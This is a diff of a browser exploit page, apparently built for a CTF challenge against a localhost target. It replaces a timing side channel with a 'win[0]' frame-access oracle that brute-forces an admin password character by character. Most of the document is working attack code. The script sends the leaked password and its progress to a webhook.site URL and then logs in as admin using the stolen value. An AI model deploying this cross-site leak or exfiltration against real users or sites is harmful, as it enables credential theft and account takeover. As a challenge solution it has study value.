@@ -1,12 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head><title>Object Timing Attack</title></head>
+<head><title>win[0] Frame Access Exploit</title></head>
 <body>
-<h1>Object-based timing attack...</h1>
+<h1>Password leak via win[0] frame access...</h1>
 <pre id="output"></pre>
 <script>
 const output = document.getElementById('output');
 const TARGET = 'https://127.0.0.1:9999/';
+const WEBHOOK = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/';
 const CHARSET = '0123456789abcdef';
 let knownPassword = 'lebah';
 
@@ -15,97 +16,74 @@ function log(msg) {
     console.log(msg);
 }
 
-// Object-based timing measurement (more reliable than iframe)
-function leak(pass) {
-    return new Promise(resolve => {
-        const start = performance.now();
-        const object = document.createElement('object');
-        object.width = '2000px';  // Important for timing difference!
-        object.height = '2000px';
-        object.data = TARGET + '?pass=' + encodeURIComponent(pass);
+// Frame access oracle - returns true if iframe exists
+async function hasFrame(pass) {
+    return new Promise((resolve) => {
+        const win = window.open(TARGET + '?pass=' + encodeURIComponent(pass), '_blank');
         
-        object.onload = () => {
-            object.remove();
-            const end = performance.now();
-            resolve(end - start);
-        };
-        
-        object.onerror = () => {
-            object.remove();
-            const end = performance.now();
-            resolve(end - start);
-        };
-        
-        // Timeout fallback
         setTimeout(() => {
-            if (object.parentNode) {
-                object.remove();
-                const end = performance.now();
-                resolve(end - start);
+            let result = false;
+            
+            try {
+                // If iframe exists, win[0] will be defined
+                result = (win[0] !== undefined);
+            } catch (e) {
+                // Cross-origin error also indicates frame exists
+                result = true;
             }
-        }, 2000);
-        
-        document.body.appendChild(object);
+            
+            win.close();
+            resolve(result);
+        }, 600); // 600ms for faster execution
     });
 }
 
 async function leakPassword() {
-    log('[*] Object-based timing attack (justCTF technique)');
+    log('[*] WIN[0] FRAME ACCESS ORACLE');
     log('[*] Known prefix: ' + knownPassword);
+    log('');
     
-    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?status=object_attack_started').catch(e=>{});
+    fetch(WEBHOOK + '?status=win0_exploit_started').catch(e=>{});
     
-    // Calibrate timing threshold
-    log('\n[*] Calibrating timing threshold...');
+    // Verify oracle works
+    log('[*] Verifying oracle...');
+    const testGood = await hasFrame('lebah');
+    log(`  "lebah" (should be TRUE): ${testGood}`);
     
-    let foundTime = 0;
-    let notFoundTime = 0;
+    const testBad = await hasFrame('lebahZ');
+    log(`  "lebahZ" (should be FALSE): ${testBad}`);
     
-    // Test known good (should be slow - has iframe)
-    for (let i = 0; i < 3; i++) {
-        foundTime += await leak('lebah');
-    }
-    foundTime /= 3;
-    
-    // Test known bad (should be fast - no iframe)
-    for (let i = 0; i < 3; i++) {
-        notFoundTime += await leak('lebahZ');
-    }
-    notFoundTime /= 3;
-    
-    const threshold = foundTime - ((foundTime - notFoundTime) / 2);
-    
-    log(`  Found (match): ${foundTime.toFixed(0)}ms`);
-    log(`  Not found: ${notFoundTime.toFixed(0)}ms`);
-    log(`  Threshold: ${threshold.toFixed(0)}ms`);
-    
-    if (notFoundTime >= foundTime) {
-        log('\n❌ Timing calibration failed! No clear difference detected.');
-        fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?error=timing_calibration_failed').catch(e=>{});
+    if (!testGood || testBad) {
+        log('\n❌ Oracle verification failed!');
+        fetch(WEBHOOK + '?error=oracle_verification_failed').catch(e=>{});
         return;
     }
     
-    log('\n✅ Timing calibration successful!\n');
+    log('\n✅ Oracle verified! Starting leak...\n');
     
-    // Leak characters (reduced to 4 for speed)
-    for (let pos = 0; pos < 4; pos++) { // Only 4 chars to fit in 30s
-        log(`[*] Position ${pos+1}/4...`);
+    // Leak password character by character with PARALLEL testing
+    for (let pos = 0; pos < 12; pos++) { // Full 12 chars (lebah + 6 hex)
+        log(`[*] Position ${pos + 1}/12...`);
         let found = false;
         
-        for (let c of CHARSET) {
+        // Test all 16 characters in parallel!
+        const promises = CHARSET.split('').map(c => {
             const candidate = knownPassword + c;
+            return hasFrame(candidate).then(match => ({ char: c, match }));
+        });
+        
+        const results = await Promise.all(promises);
+        
+        // Check results
+        for (let r of results) {
+            log(`  "${r.char}": ${r.match ? '✓ MATCH!' : '✗'}`);
             
-            // Single measurement for speed
-            const avgTime = await leak(candidate);
-            
-            log(`  "${c}": ${avgTime.toFixed(0)}ms ${avgTime >= threshold ? '✓ MATCH!' : ''}`);
-            
-            if (avgTime >= threshold) {
-                knownPassword = candidate;
-                log(`  [+] Found '${c}' -> ${knownPassword}\n`);
+            if (r.match) {
+                knownPassword += r.char;
+                log(`  [+] Found '${r.char}' -> ${knownPassword}\n`);
                 
                 // Send progress
-                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
+                fetch(WEBHOOK + '?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
                 
                 found = true;
                 break;
@@ -113,7 +91,7 @@ async function leakPassword() {
         }
         
         if (!found) {
-            log(`  [-] No match at position ${pos+1}!`);
+            log(`  [-] No match at position ${pos + 1}!`);
             break;
         }
     }
@@ -123,7 +101,7 @@ async function leakPassword() {
     log('========================================');
     
     // Final exfiltration
-    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?password=' + encodeURIComponent(knownPassword)).catch(e=>{});
+    fetch(WEBHOOK + '?PASSWORD=' + encodeURIComponent(knownPassword)).catch(e=>{});
     
     // Test login
     log('\n[*] Testing login...');
@@ -133,14 +111,15 @@ async function leakPassword() {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: `username=admin&password=${encodeURIComponent(knownPassword)}`,
-                credentials: 'include'
+                credentials: 'include',
+                redirect: 'manual'
             });
             
-            const success = response.redirected || !response.url.includes('login');
-            log(`Login result: ${success ? '✅ SUCCESS!' : '❌ Failed'}`);
+            const success = response.type === 'opaqueredirect' || response.status === 0;
+            log(`Login test: ${success ? '✅ SUCCESS!' : '❌ Failed'}`);
             
             if (success) {
-                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?LOGIN_SUCCESS=' + encodeURIComponent(knownPassword)).catch(e=>{});
+                fetch(WEBHOOK + '?LOGIN_SUCCESS=' + encodeURIComponent(knownPassword)).catch(e=>{});
             }
         } catch (e) {
             log('Login test error: ' + e.message);
